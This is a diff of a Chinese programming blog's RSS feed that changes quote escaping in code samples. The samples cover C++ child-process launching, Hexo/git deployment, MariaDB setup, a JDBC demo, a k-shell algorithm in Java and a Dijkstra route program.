 cout&amp;lt;&amp;lt;buffer&amp;lt;&amp;lt;endl;
@@ -3392,8 +3392,8 @@ UINT uCmdShow //显示模式，设置不同的参数可以实现控制台隐藏�
 using namespace std;
 int main(){
 char buffer[4096];
-WinExec(&amp;quot;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;result.txt&amp;quot;,SW_SHOW);
-fstream file(&amp;quot;.\\result.txt&amp;quot;);
+WinExec(&amp;#34;.\\child.exe argv1 argv2 argv3 &amp;gt;&amp;gt;result.txt&amp;#34;,SW_SHOW);
+fstream file(&amp;#34;.\\result.txt&amp;#34;);
 while (file.is_open() &amp;amp;&amp;amp; !file.eof()){
 file.read(buffer,4096);
 cout&amp;lt;&amp;lt;buffer&amp;lt;&amp;lt;endl;
@@ -3447,10 +3447,10 @@ int main(){
 HINSTANCE ret;
 ret=ShellExecute(
 GetDesktopWindow(), //获取窗口句柄
-&amp;quot;open&amp;quot;, //指定操作
-&amp;quot;child.exe&amp;quot;, //程序文件名称
-&amp;quot;argv1 agr2 argv3&amp;quot;, //命令行参数
-&amp;quot;.\\&amp;quot;, //程序所在目录
+&amp;#34;open&amp;#34;, //指定操作
+&amp;#34;child.exe&amp;#34;, //程序文件名称
+&amp;#34;argv1 agr2 argv3&amp;#34;, //命令行参数
+&amp;#34;.\\&amp;#34;, //程序所在目录
 SW_HIDE //子程序显示模式
 );
 return 0;
@@ -3488,10 +3488,10 @@ ZeroMemory(&amp;amp;shellinfo,sizeof(SHELLEXECUTEINFO)); //初始化结构体数
 shellinfo.cbSize=sizeof(SHELLEXECUTEINFO); //cbSzie存储结构体大小
 shellinfo.fMask=SEEK_MASK_NOCLOSEPROCESS; //标志表明其他结构成员的内容和有效性,SEEK_MASK_NOCLOSEPRCESS指明使用hProcess接收进程句柄
 shellinfo.hwnd=GetDesktopWindow(); //获取窗口句柄
-shellinfo.lpVerb=&amp;quot;open&amp;quot;; //指定操作类型，同上面的lpOperation
-shellinfo.lpFile=&amp;quot;child.exe&amp;quot;; //指定文件名
-shellinfo.lpParameters=&amp;quot;agrv1 argv2 argv3&amp;quot;; //传入子程序的参数
-shellinfo.lpDirectory=&amp;quot;.\\&amp;quot;; //子程序工作目录
+shellinfo.lpVerb=&amp;#34;open&amp;#34;; //指定操作类型，同上面的lpOperation
+shellinfo.lpFile=&amp;#34;child.exe&amp;#34;; //指定文件名
+shellinfo.lpParameters=&amp;#34;agrv1 argv2 argv3&amp;#34;; //传入子程序的参数
+shellinfo.lpDirectory=&amp;#34;.\\&amp;#34;; //子程序工作目录
 shellinfo.nShow=SW_HIDE; //子程序窗体显示，SW_HIDE隐藏
 shellinfo.hInstApp=NULL; //如果SEEK_MASK_NOCLOSEPROCESS参数被设置，该参数用于接收返回子程序的执行情况，类似ShellExecute函数的返回值
 BOOL ret=ShellExecuteEx(&amp;amp;shellinfo);
@@ -3551,7 +3551,7 @@ sa.nLength=sizeof(SECURITY_ATTRIBUTES); //结构体长度赋值
 sa.lpSecurityDescriptor=NULL; //NULL管道默认安全描述符,管道的安全属性将继承与父程序
 sa.bInheritHandle=TRUE; //一个布尔值，指定在创建新进程时是否继承返回的句柄。如果此成员为TRUE，则新进程将继承该句柄。
 if(!CreatePipe(&amp;amp;hRead,&amp;amp;hWrite,&amp;amp;sa,0)){ //尝试创建管道，失败则弹出提示并退出
-MessageBox(NULL,&amp;quot;Error on CreatePipe()&amp;quot;,&amp;quot;WARNING&amp;quot;,MB_OK);
+MessageBox(NULL,&amp;#34;Error on CreatePipe()&amp;#34;,&amp;#34;WARNING&amp;#34;,MB_OK);
 return 1;
 }
 STARTUPINFO si; //启动信息结构体
@@ -3563,15 +3563,15 @@ si.hStdOutput=hWrite; //重定向标准输出新信息到管道
 si.wShowWindow=SW_HIDE; //设定子进程窗体是否隐藏
 si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //wShowWindow成员将包含其他信息；hStdInput，hStdOutput和hStdError成员包含其他信息。
 if (!CreateProcess(
-&amp;quot;.//child.exe&amp;quot;, //子进程完整目录
-&amp;quot;argv1 argv2 argv3&amp;quot;, //命令行参数
+&amp;#34;.//child.exe&amp;#34;, //子进程完整目录
+&amp;#34;argv1 argv2 argv3&amp;#34;, //命令行参数
 NULL,NULL,
 TRUE, //新进程继承父进程相关权限
 NULL,NULL,NULL,
 &amp;amp;si, //启动信息结构体指针
 &amp;amp;pi) //进程信息结构体指针
 ){
-MessageBox(NULL,&amp;quot;Error on CreateProcess()&amp;quot;,&amp;quot;WARNING&amp;quot;,MB_OK);
+MessageBox(NULL,&amp;#34;Error on CreateProcess()&amp;#34;,&amp;#34;WARNING&amp;#34;,MB_OK);
 return 1;
 }
 CloseHandle(hWrite); //关闭管道写入句柄
@@ -3636,7 +3636,7 @@ git add remote origin git@host:blog.git
 &lt;li>
 &lt;p>接下来是git的基本操作，添加本地文件到git，以及提交&lt;/p>
 &lt;pre tabindex="0">&lt;code>git add *
-git commit -m &amp;quot;你的提交说明&amp;quot;
+git commit -m &amp;#34;你的提交说明&amp;#34;
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>将文件提交到你所创建的分支（这里我创建的分支名为hexo）&lt;/p>
@@ -3650,7 +3650,7 @@ git commit -m &amp;quot;你的提交说明&amp;quot;
 &lt;/li>
 &lt;li>
 &lt;p>在你的新设备上生成秘钥&lt;/p>
-&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;quot;your_email@email.com&amp;quot;
+&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;#34;your_email@email.com&amp;#34;
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>将生成的公钥，即～/.ssh/id_rsa.pub文件的内容复制到git服务器的～/git/.ssh/authorized_keys文件中&lt;/p>
@@ -3682,7 +3682,7 @@ hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo d
 //添加文件
 git add *
 //提交
-git commit -m &amp;quot;你的提交说明&amp;quot;
+git commit -m &amp;#34;你的提交说明&amp;#34;
 //先拉取远程仓库的文件对比合并
 git pull origin hexo
 //解决版本冲突之后推送到hexo分支
@@ -3774,13 +3774,13 @@ Codename: Core
 [root@host /]# mysql_secure_installation
 NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB
 SERVERS IN PRODUCTION USE! PLEASE READ EACH STEP CAREFULLY!
-In order to log into MariaDB to secure it, we'll need the current
-password for the root user. If you've just installed MariaDB, and
-you haven't set the root password yet, the password will be blank,
+In order to log into MariaDB to secure it, we&amp;#39;ll need the current
+password for the root user. If you&amp;#39;ve just installed MariaDB, and
+you haven&amp;#39;t set the root password yet, the password will be blank,
 so you should just press enter here.
 # 输入数据库root用户名密码，初始默认为空
 Enter current password for root (enter for none):
-ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
+ERROR 1045 (28000): Access denied for user &amp;#39;root&amp;#39;@&amp;#39;localhost&amp;#39; (using password: YES)
 Enter current password for root (enter for none):
 OK, successfully used password, moving on...
 Setting the root password ensures that nobody can log into the MariaDB
@@ -3800,12 +3800,12 @@ production environment.
 # 是否移除匿名用户？ 是
 Remove anonymous users? [Y/n] Y
 ... Success!
-Normally, root should only be allowed to connect from 'localhost'. This
+Normally, root should only be allowed to connect from &amp;#39;localhost&amp;#39;. This
 ensures that someone cannot guess at the root password from the network.
 # 禁止root用户从远程登陆，仅允许本地登录 是
 Disallow root login remotely? [Y/n] Y
 ... Success!
-By default, MariaDB comes with a database named 'test' that anyone can
+By default, MariaDB comes with a database named &amp;#39;test&amp;#39; that anyone can
 access. This is also intended only for testing, and should be removed
 before moving into a production environment.
 # 移除测试用数据库 是
@@ -3820,7 +3820,7 @@ will take effect immediately.
 Reload privilege tables now? [Y/n] Y
 ... Success!
 Cleaning up...
-All done! If you've completed all of the above steps, your MariaDB
+All done! If you&amp;#39;ve completed all of the above steps, your MariaDB
 installation should now be secure.
 Thanks for using MariaDB!
 &lt;/code>&lt;/pre>&lt;/li>
@@ -3941,7 +3941,7 @@ loading="lazy"
 &lt;/li>
 &lt;li>
 &lt;p>修改密码&lt;/p>
-&lt;pre tabindex="0">&lt;code>ALTER user 'root'@'local' IDENTIFIED BY 'your_password你的密码';
+&lt;pre tabindex="0">&lt;code>ALTER user &amp;#39;root&amp;#39;@&amp;#39;local&amp;#39; IDENTIFIED BY &amp;#39;your_password你的密码&amp;#39;;
 &lt;/code>&lt;/pre>&lt;p>&lt;strong>坑:数据库命令大小写其实无所谓，可以都是小写。别忘了末尾的分号&lt;/strong>&lt;/p>
 &lt;/li>
 &lt;li>
@@ -4016,7 +4016,7 @@ create table student(no VARCHAR(20,name VARCHAR(20),math INT,average DOUBLE);
 &lt;ul>
 &lt;li>
 &lt;p>&lt;strong>坑:mysql8.0.x新版在java调用时要增加参数化serverTimezone=UTC，设置数据库时间为世界标准时间，否则会报以下错误&lt;/strong>&lt;/p>
-&lt;pre tabindex="0">&lt;code> Caused by: java.sql.SQLException: The server time zone value '�й���׼ʱ��' is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support.
+&lt;pre tabindex="0">&lt;code> Caused by: java.sql.SQLException: The server time zone value &amp;#39;�й���׼ʱ��&amp;#39; is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support.
 &lt;/code>&lt;/pre>&lt;ul>
 &lt;li>连接数据库出现access deny字样&lt;/li>
 &lt;/ul>
@@ -4029,37 +4029,37 @@ create table student(no VARCHAR(20,name VARCHAR(20),math INT,average DOUBLE);
 &lt;h3 id="请确保已经将mysqlconnector加入项目构建目录参照将jar文件加入你的java项目将jar文件加入你的java项目">请确保已经将mysqlconnector加入项目构建目录，参照&lt;a class="link" href="#%e5%b0%86jar%e6%96%87%e4%bb%b6%e5%8a%a0%e5%85%a5%e4%bd%a0%e7%9a%84java%e9%a1%b9%e7%9b%ae" >将jar文件加入你的java项目&lt;/a>&lt;/h3>
 &lt;pre tabindex="0">&lt;code>public class MySQLDemo {
 // JDBC 驱动名及数据库 URL
-static final String JDBC_DRIVER = &amp;quot;com.mysql.cj.jdbc.Driver&amp;quot;;
-static final String DB_URL = &amp;quot;jdbc:mysql://localhost:3306/RUNOOB&amp;quot;;//RUNOOB为数据库（database）名称
+static final String JDBC_DRIVER = &amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;;
+static final String DB_URL = &amp;#34;jdbc:mysql://localhost:3306/RUNOOB&amp;#34;;//RUNOOB为数据库（database）名称
 // 数据库的用户名与密码，需要根据自己的设置
-static final String USER = &amp;quot;root&amp;quot;;
-static final String PASS = &amp;quot;123456&amp;quot;;
+static final String USER = &amp;#34;root&amp;#34;;
+static final String PASS = &amp;#34;123456&amp;#34;;
 public static void main(String[] args) {
 Connection conn = null;
 Statement stmt = null;
 try{
 // 注册 JDBC 驱动
-Class.forName(&amp;quot;com.mysql.cj.jdbc.Driver&amp;quot;);
+Class.forName(&amp;#34;com.mysql.cj.jdbc.Driver&amp;#34;);
 // 打开链接
-System.out.println(&amp;quot;连接数据库...&amp;quot;);
+System.out.println(&amp;#34;连接数据库...&amp;#34;);
 conn = DriverManager.getConnection(DB_URL,USER,PASS);
 // 执行查询
-System.out.println(&amp;quot; 实例化Statement对象...&amp;quot;);
+System.out.println(&amp;#34; 实例化Statement对象...&amp;#34;);
 stmt = conn.createStatement();
 String sql;
-sql = &amp;quot;SELECT id, name, url FROM websites&amp;quot;;//构建sql语句 id name url均为字段名 websites表名
+sql = &amp;#34;SELECT id, name, url FROM websites&amp;#34;;//构建sql语句 id name url均为字段名 websites表名
 ResultSet rs = stmt.executeQuery(sql);//执行sql语句并获取返回结果
 // 展开结果集数据库
 while(rs.next()){
 // 通过字段检索
-int id = rs.getInt(&amp;quot;id&amp;quot;);
-String name = rs.getString(&amp;quot;name&amp;quot;);
-String url = rs.getString(&amp;quot;url&amp;quot;);
+int id = rs.getInt(&amp;#34;id&amp;#34;);
+String name = rs.getString(&amp;#34;name&amp;#34;);
+String url = rs.getString(&amp;#34;url&amp;#34;);
 // 输出数据
-System.out.print(&amp;quot;ID: &amp;quot; + id);
-System.out.print(&amp;quot;, 站点名称: &amp;quot; + name);
-System.out.print(&amp;quot;, 站点 URL: &amp;quot; + url);
-System.out.print(&amp;quot;\n&amp;quot;);
+System.out.print(&amp;#34;ID: &amp;#34; + id);
+System.out.print(&amp;#34;, 站点名称: &amp;#34; + name);
+System.out.print(&amp;#34;, 站点 URL: &amp;#34; + url);
+System.out.print(&amp;#34;\n&amp;#34;);
 }
 // 完成后关闭
 rs.close();
@@ -4083,7 +4083,7 @@ if(conn!=null) conn.close();
 se.printStackTrace();
 }
 }
-System.out.println(&amp;quot;Goodbye!&amp;quot;);
+System.out.println(&amp;#34;Goodbye!&amp;#34;);
 }
 }
 &lt;/code>&lt;/pre></description></item><item><title>k-shell算法Java实现</title><link>https://blog.yuukisama.cc/p/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/</link><pubDate>Fri, 28 Dec 2018 15:06:28 +0000</pubDate><guid>https://blog.yuukisama.cc/p/k-shell%E7%AE%97%E6%B3%95java%E5%AE%9E%E7%8E%B0/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
@@ -4144,13 +4144,13 @@ File f=new File(filename); //尝试打开文件
 FileInputStream fstream=new FileInputStream(f);
 InputStreamReader ireader=new InputStreamReader(fstream);
 BufferedReader breader=new BufferedReader(ireader);
-String line=&amp;quot;&amp;quot;; //存储每一行的数据
-String a=&amp;quot;&amp;quot;; //存储逗号左边
-String b=&amp;quot;&amp;quot;; //存储逗号右边
+String line=&amp;#34;&amp;#34;; //存储每一行的数据
+String a=&amp;#34;&amp;#34;; //存储逗号左边
+String b=&amp;#34;&amp;#34;; //存储逗号右边
 String[] points;//存储行数据分割之后的内容
 HashSet&amp;lt;String&amp;gt; temp=null;
 while ((line=breader.readLine())!=null){
-points=line.split(&amp;quot;,&amp;quot;); //以逗号分割字符串
+points=line.split(&amp;#34;,&amp;#34;); //以逗号分割字符串
 a=points[0];
 b=points[1];
 temp=map.get(a);
@@ -4185,7 +4185,7 @@ e.printStackTrace();
 Iterator iter=map.entrySet().iterator();
 while (iter.hasNext()){
 Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
-System.out.println(entry.getKey()+&amp;quot; &amp;quot;+entry.getValue().toString());
+System.out.println(entry.getKey()+&amp;#34; &amp;#34;+entry.getValue().toString());
 }
 }
 &lt;/code>&lt;/pre>&lt;/li>
@@ -4195,7 +4195,7 @@ System.out.println(entry.getKey()+&amp;quot; &amp;quot;+entry.getValue().toStrin
 Iterator iter=kmap.entrySet().iterator();
 while(iter.hasNext()){
 Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
-System.out.println(entry.getKey().toString()+&amp;quot; &amp;quot;+entry.getValue().toString());
+System.out.println(entry.getKey().toString()+&amp;#34; &amp;#34;+entry.getValue().toString());
 }
 }
 &lt;/code>&lt;/pre>&lt;/li>
@@ -4235,7 +4235,7 @@ iter.remove();
 // String keytemp=entry.getKey();
 // entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
 // map.remove(keytemp);
-// System.out.println(&amp;quot;delete ...&amp;quot;);
+// System.out.println(&amp;#34;delete ...&amp;#34;);
 // }
 // }
 kmap.put(Integer.valueOf(k),ktemp);
@@ -4266,13 +4266,13 @@ File f=new File(filename);
 FileInputStream fstream=new FileInputStream(f);
 InputStreamReader ireader=new InputStreamReader(fstream);
 BufferedReader breader=new BufferedReader(ireader);
-String line=&amp;quot;&amp;quot;;
-String a=&amp;quot;&amp;quot;;
-String b=&amp;quot;&amp;quot;;
+String line=&amp;#34;&amp;#34;;
+String a=&amp;#34;&amp;#34;;
+String b=&amp;#34;&amp;#34;;
 String[] points;
 HashSet&amp;lt;String&amp;gt; temp=null;
 while ((line=breader.readLine())!=null){
-points=line.split(&amp;quot;,&amp;quot;);
+points=line.split(&amp;#34;,&amp;#34;);
 a=points[0];
 b=points[1];
 temp=map.get(a);
@@ -4304,7 +4304,7 @@ private static void mapprint(){
 Iterator iter=map.entrySet().iterator();
 while (iter.hasNext()){
 Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
-System.out.println(entry.getKey()+&amp;quot; &amp;quot;+entry.getValue().toString());
+System.out.println(entry.getKey()+&amp;#34; &amp;#34;+entry.getValue().toString());
 }
 }
 private static void kshell_func(){
@@ -4335,7 +4335,7 @@ iter.remove();
 // String keytemp=entry.getKey();
 // entry=(Map.Entry&amp;lt;String,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
 // map.remove(keytemp);
-// System.out.println(&amp;quot;delete ...&amp;quot;);
+// System.out.println(&amp;#34;delete ...&amp;#34;);
 // }
 // }
 kmap.put(Integer.valueOf(k),ktemp);
@@ -4346,16 +4346,16 @@ private static void printkmap(){
 Iterator iter=kmap.entrySet().iterator();
 while(iter.hasNext()){
 Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt; entry=(Map.Entry&amp;lt;Integer,HashSet&amp;lt;String&amp;gt;&amp;gt;) iter.next();
-System.out.println(entry.getKey().toString()+&amp;quot; &amp;quot;+entry.getValue().toString());
+System.out.println(entry.getKey().toString()+&amp;#34; &amp;#34;+entry.getValue().toString());
 }
 }
 public static void main(String[] args) {
-loadfile(&amp;quot;./data.txt&amp;quot;);
+loadfile(&amp;#34;./data.txt&amp;#34;);
 //mapprint();
 kshell_func();
 //mapprint();
 printkmap();
-System.out.println(&amp;quot;complete&amp;quot;);
+System.out.println(&amp;#34;complete&amp;#34;);
 }
 }
 &lt;/code>&lt;/pre></description></item><item><title>小站成长日记-搜索引擎可发现</title><link>https://blog.yuukisama.cc/p/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF%E6%97%A5%E8%AE%B0-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/</link><pubDate>Thu, 27 Dec 2018 23:53:12 +0000</pubDate><guid>https://blog.yuukisama.cc/p/%E5%B0%8F%E7%AB%99%E6%88%90%E9%95%BF%E6%97%A5%E8%AE%B0-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%AF%E5%8F%91%E7%8E%B0/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
@@ -4521,7 +4521,7 @@ CityList[i]= {0};
 }
 void Mapdel() {
 int x;
-cout&amp;lt;&amp;lt;&amp;quot;请输入您要删除的城市编号:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;请输入您要删除的城市编号:&amp;#34;;
 cin&amp;gt;&amp;gt;x;
 Delname(x);
 Delcol(x);
@@ -4556,7 +4556,7 @@ int map[MAXLEN][MAXLEN]= {0};
 int N;
 bool check_input(int x,int y,int w,int N){
 if (w&amp;lt;0 || x==y || x&amp;gt;N || y&amp;gt;N || (map[x][y]!=0 &amp;amp;&amp;amp; map[x][y]!=MAX)|| (map[x][y]!=0 &amp;amp;&amp;amp; map[x][y]!=MAX)){
-cout&amp;lt;&amp;lt;&amp;quot;该组数据不符合规范，请重新输入&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;该组数据不符合规范，请重新输入&amp;#34;&amp;lt;&amp;lt;endl;
 getch();
 return true;
 }
@@ -4565,25 +4565,25 @@ return false;
 void Readin() {
 int M,x,y,w;
 memset(map,sizeof(map),0);
-cout&amp;lt;&amp;lt;&amp;quot;请输入城市总数:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;请输入城市总数:&amp;#34;;
 cin&amp;gt;&amp;gt;N;
-cout&amp;lt;&amp;lt;&amp;quot;请输入路径数量:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;请输入路径数量:&amp;#34;;
 cin&amp;gt;&amp;gt;M;
 if (M&amp;gt;(N+1)*N/2){
-cout&amp;lt;&amp;lt;&amp;quot;您输入的路径数量大于最大可能路径数量&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;您输入的路径数量大于最大可能路径数量&amp;#34;&amp;lt;&amp;lt;endl;
 getch();
 return;
 }
 cout&amp;lt;&amp;lt;endl;
 for (int i=1; i&amp;lt;=N; i++) {
-printf(&amp;quot;第%d个城市名称:&amp;quot;,i);
+printf(&amp;#34;第%d个城市名称:&amp;#34;,i);
 cin&amp;gt;&amp;gt;CityList[i];
 }
-printf(&amp;quot;城市x编号 城市y编号 路径长度\n&amp;quot;);
-printf(&amp;quot;-----------------------------\n&amp;quot;);
+printf(&amp;#34;城市x编号 城市y编号 路径长度\n&amp;#34;);
+printf(&amp;#34;-----------------------------\n&amp;#34;);
 for (int i=1; i&amp;lt;=M; i++) {
 do{
-printf(&amp;quot;第%d组:&amp;quot;,i);
+printf(&amp;#34;第%d组:&amp;#34;,i);
 cin&amp;gt;&amp;gt;x&amp;gt;&amp;gt;y&amp;gt;&amp;gt;w;
 }while(check_input(x,y,w,N));
 map[x][y]=w;
@@ -4596,40 +4596,40 @@ if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
 }
 void Mapprint(int n=N) {
 if (N==0) return;
-cout&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
-for (int i=1; i&amp;lt;=n; i++) cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
+for (int i=1; i&amp;lt;=n; i++) cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
 cout&amp;lt;&amp;lt;endl;
-for (int i=1; i&amp;lt;=n*9; i++) cout&amp;lt;&amp;lt;'-';
+for (int i=1; i&amp;lt;=n*9; i++) cout&amp;lt;&amp;lt;&amp;#39;-&amp;#39;;
 cout&amp;lt;&amp;lt;endl;
 for (int i=1; i&amp;lt;=n; i++) {
-cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
+cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
 for (int j=1; j&amp;lt;=n; j++)
-if (map[i][j]!=MAX) cout&amp;lt;&amp;lt;map[i][j]&amp;lt;&amp;lt;&amp;quot;\t&amp;quot;;
-else cout&amp;lt;&amp;lt;&amp;quot;-\t&amp;quot;;
+if (map[i][j]!=MAX) cout&amp;lt;&amp;lt;map[i][j]&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
+else cout&amp;lt;&amp;lt;&amp;#34;-\t&amp;#34;;
 cout&amp;lt;&amp;lt;endl;
 }
 }
 void Mapadd() {
 int n,x,y,w,m;
-cout&amp;lt;&amp;lt;&amp;quot;请输入增加的城市个数:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;请输入增加的城市个数:&amp;#34;;
 cin&amp;gt;&amp;gt;n;
-cout&amp;lt;&amp;lt;&amp;quot;请输入新增的路径个数:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;请输入新增的路径个数:&amp;#34;;
 cin&amp;gt;&amp;gt;m;
 // if (m&amp;gt;(N*n+(n+1)*n/2)){
-// cout&amp;lt;&amp;lt;&amp;quot;您输入的路径数量大于最大可能路径数量&amp;quot;&amp;lt;&amp;lt;endl;
+// cout&amp;lt;&amp;lt;&amp;#34;您输入的路径数量大于最大可能路径数量&amp;#34;&amp;lt;&amp;lt;endl;
 // getch();
 // return;
 // }
 cout&amp;lt;&amp;lt;endl;
 for(int i=N+1; i&amp;lt;=N+n; i++) {
-printf(&amp;quot;第%d个城市的名称:&amp;quot;,i);
+printf(&amp;#34;第%d个城市的名称:&amp;#34;,i);
 cin&amp;gt;&amp;gt;CityList[i];
 }
-printf(&amp;quot;\n城市x编号 城市y编号 路径长度\n&amp;quot;);
-printf(&amp;quot;-----------------------------\n&amp;quot;);
+printf(&amp;#34;\n城市x编号 城市y编号 路径长度\n&amp;#34;);
+printf(&amp;#34;-----------------------------\n&amp;#34;);
 for (int i=1; i&amp;lt;=m; i++) {
 do{
-printf(&amp;quot;第%d组:&amp;quot;,i);
+printf(&amp;#34;第%d组:&amp;#34;,i);
 cin&amp;gt;&amp;gt;x&amp;gt;&amp;gt;y&amp;gt;&amp;gt;w;
 }while (check_input(x,y,w,N+n));
 map[x][y]=w;
@@ -4663,7 +4663,7 @@ CityList[i]= {0};
 }
 void Mapdel() {
 int x;
-cout&amp;lt;&amp;lt;&amp;quot;请输入您要删除的城市编号:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;请输入您要删除的城市编号:&amp;#34;;
 cin&amp;gt;&amp;gt;x;
 Delname(x);
 Delcol(x);
@@ -4673,21 +4673,21 @@ N--;
 void Mapmod(){
 string x,y;
 int i,j,w;
-cout&amp;lt;&amp;lt;&amp;quot;请输入您要修改的两个城市的名称&amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot;城市A:&amp;quot;; cin&amp;gt;&amp;gt;x;
-cout&amp;lt;&amp;lt;&amp;quot;城市B:&amp;quot;; cin&amp;gt;&amp;gt;y;
-cout&amp;lt;&amp;lt;&amp;quot;请输入修改值(输入值&amp;lt;=0删除路径):&amp;quot;; cin&amp;gt;&amp;gt;w;
+cout&amp;lt;&amp;lt;&amp;#34;请输入您要修改的两个城市的名称&amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;城市A:&amp;#34;; cin&amp;gt;&amp;gt;x;
+cout&amp;lt;&amp;lt;&amp;#34;城市B:&amp;#34;; cin&amp;gt;&amp;gt;y;
+cout&amp;lt;&amp;lt;&amp;#34;请输入修改值(输入值&amp;lt;=0删除路径):&amp;#34;; cin&amp;gt;&amp;gt;w;
 for (i=1;i&amp;lt;=N;i++)
 if (x==CityList[i]) break;
 for (j=1;i&amp;lt;=N;j++)
 if (y==CityList[j]) break;
 if (i==N &amp;amp;&amp;amp; CityList[i]!=x){
-cout&amp;lt;&amp;lt;&amp;quot;无法找到城市A&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;无法找到城市A&amp;#34;&amp;lt;&amp;lt;endl;
 getch();
 return;
 }
 if (j==N &amp;amp;&amp;amp; CityList[j]!=y){
-cout&amp;lt;&amp;lt;&amp;quot;无法找到城市B&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;无法找到城市B&amp;#34;&amp;lt;&amp;lt;endl;
 getch();
 return;
 }
@@ -4707,10 +4707,10 @@ return false;
 }
 void Dijkstra(){
 int d,s=1,pos,m;
-cout&amp;lt;&amp;lt;&amp;quot;请输入目的地城市（默认出发城市即编号为1的城市）&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;请输入目的地城市（默认出发城市即编号为1的城市）&amp;#34;&amp;lt;&amp;lt;endl;
 cin&amp;gt;&amp;gt;d;
 if (d&amp;gt;N){
-cout&amp;lt;&amp;lt;&amp;quot;您输入的城市超出范围&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;您输入的城市超出范围&amp;#34;&amp;lt;&amp;lt;endl;
 getch();
 return;
 }
@@ -4720,7 +4720,7 @@ string route[MAXLEN];
 memset(is_v,0,sizeof(bool)*MAXLEN);
 for (int i=1;i&amp;lt;=N;i++){
 dis[i]=map[s][i];
-route[i]=CityList[s]+&amp;quot;--&amp;gt;&amp;quot;+CityList[i];
+route[i]=CityList[s]+&amp;#34;--&amp;gt;&amp;#34;+CityList[i];
 }
 dis[s]=0;
 is_v[s]=true;
@@ -4737,47 +4737,47 @@ for (int i=1;i&amp;lt;=N;i++)
 if (!is_v[i] &amp;amp;&amp;amp; dis[pos]+map[pos][i]&amp;gt;=0) {
 if (dis[i]&amp;gt;dis[pos]+map[pos][i]){
 dis[i]=dis[pos]+map[pos][i];
-route[i]=route[pos]+&amp;quot;--&amp;gt;&amp;quot;+CityList[i];
+route[i]=route[pos]+&amp;#34;--&amp;gt;&amp;#34;+CityList[i];
 }
 }
 }
 if (dis[d]==0){
-cout&amp;lt;&amp;lt;&amp;quot;不存在抵达该城市的路径&amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;不存在抵达该城市的路径&amp;#34;&amp;lt;&amp;lt;endl;
 getch();
 return;
 }
-cout&amp;lt;&amp;lt;&amp;quot;最短路径长度:&amp;quot;;
+cout&amp;lt;&amp;lt;&amp;#34;最短路径长度:&amp;#34;;
 cout&amp;lt;&amp;lt;dis[d]&amp;lt;&amp;lt;endl;
 cout&amp;lt;&amp;lt;route[d]&amp;lt;&amp;lt;endl;
 getch();
 }
 void logo(){
-system(&amp;quot;cls&amp;quot;);
-printf(&amp;quot; ____ _ _ __ __ \n&amp;quot;);
-printf(&amp;quot; / __ \(_) (_) /_______/ /__________ _\n&amp;quot;);
-printf(&amp;quot; / / / / / / / //_/ ___/ __/ ___/ __ `/\n&amp;quot;);
